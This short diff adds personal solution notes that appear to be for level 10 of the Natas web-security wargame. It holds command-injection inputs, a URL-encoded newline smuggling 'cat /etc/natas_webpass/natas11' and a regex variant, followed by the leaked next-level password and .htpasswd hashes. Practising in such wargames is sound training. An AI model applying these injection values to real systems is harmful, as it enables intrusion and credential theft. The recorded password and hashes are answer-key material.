@@ -1,0 +1,18 @@
+0 dictionary.txt%0acat /etc/natas_webpass/natas11
+
+=>fix the %0a (newline) by intercepting the request
+
+
+U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
+
+OR
+.* /etc/natas_webpass/natas11 #
+
+.htaccess:AuthType Basic
+.htaccess: AuthName "Authentication required"
+.htaccess: AuthUserFile /var/www/natas/natas10//.htpasswd
+.htaccess: require valid-user
+.htpasswd:natas10:$1$XOXwo/z0$K/6kBzbw4cQ5exEWpW5OV0
+.htpasswd:natas10:$1$mRklUuvs$D4FovAtQ6y2mb5vXLAy.P/
+.htpasswd:natas10:$1$SpbdWYWN$qM554rKY7WrlXF5P6ErYN/
+/etc/natas_webpass/natas11:U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
